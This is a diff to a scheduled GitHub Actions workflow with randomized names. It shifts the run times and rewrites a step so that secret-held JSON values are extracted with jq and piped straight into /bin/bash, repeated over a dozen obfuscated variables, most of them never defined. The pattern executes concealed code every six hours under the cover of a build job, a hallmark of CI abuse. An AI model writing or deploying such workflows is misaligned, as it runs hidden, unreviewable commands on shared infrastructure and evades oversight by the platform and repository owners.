@@ -3,7 +3,7 @@ name: zhouyiri2245
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
+    - cron: '30 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhouyiri2245
         env:
-          m54: ${{ secrets.m54 }}
+          n0: ${{ secrets.n0 }}
         run: |
-          echo $m54 | jq -r .nr29738 | /bin/bash
-          echo $p4 | jq -r .jvtto560 | /bin/bash
-          echo $yg34 | jq -r .ig5 | /bin/bash
-          echo $h218 | jq -r .giqz315 | /bin/bash
-          echo $xno055 | jq -r .purtx322 | /bin/bash
-          echo $az237 | jq -r .b6 | /bin/bash
-          echo $txol61501 | jq -r .bcrw15 | /bin/bash
-          echo $bkt66300 | jq -r .jjr2 | /bin/bash
+          echo $n0 | jq -r .t2 | /bin/bash
+          echo $qxun52293 | jq -r .iei606 | /bin/bash
+          echo $q7954 | jq -r .xcd31 | /bin/bash
+          echo $gyv259 | jq -r .x41 | /bin/bash
+          echo $nk5 | jq -r .qom166 | /bin/bash
+          echo $pxw6288 | jq -r .swkfn1 | /bin/bash
+          echo $atd498 | jq -r .jza20795 | /bin/bash
+          echo $g9 | jq -r .cwoa854 | /bin/bash
+          echo $kuvpy23 | jq -r .iy040 | /bin/bash
+          echo $blbb70365 | jq -r .cq69 | /bin/bash
+          echo $eh8 | jq -r .eq2492 | /bin/bash
 
